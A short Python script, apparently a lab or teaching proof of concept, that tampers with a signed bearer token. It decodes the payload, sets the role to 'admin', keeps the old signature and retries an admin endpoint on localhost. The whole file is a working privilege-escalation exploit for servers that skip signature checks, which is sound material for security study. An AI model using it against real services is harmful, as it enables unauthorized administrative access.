import sys
import json
import base64
import requests

TARGET_URL = 'http://localhost:5000/access_admin'

def main():
    if len(sys.argv) < 2:
        print("No argument provided. Please provide the token string to modify.")
        return
    elif len(sys.argv) > 2:
        print('Ignoring additional arguments.')

    full_token = sys.argv[1]

    try:
        encoded_data, signature = full_token.split('.')
    except ValueError as e:
        print(f'We need the full token (data . signature). Error: {e}')

    user_data = json.loads(base64.b64decode(encoded_data).decode())

    print(f'\nFor user {user_data.get('user_name')}:')
    try_access_admin(full_token)

    print(f'\n\nModifying data:\n{user_data}')
    user_data.update({'role':'admin'})

    print(f'\nNew user data.\n{user_data}')
    new_encoded_data = base64.b64encode(json.dumps(user_data).encode()).decode('utf-8')
    new_token = f'{new_encoded_data}.{signature}'
    print(f'\nNew autherization token.\n{new_token}\n\n')

    print(f'Retrying with new token. . .')
    try_access_admin(new_token)

def try_access_admin(authToken):
    '''
    Try to access the admin panel on the backend server.
    '''
    # mimic how authorization headers are transported
    headers = {
        'Authorization' : f'Bearer {authToken}'
    }

    try:
        response = requests.get(TARGET_URL, headers=headers)
        data = response.json()
    except Exception as e:
        print(f'try_access_admin: Error: {e}')

    # we see if the server authorized us as admin
    print(f'Server has responded. {data}')


if __name__ == "__main__":
    main()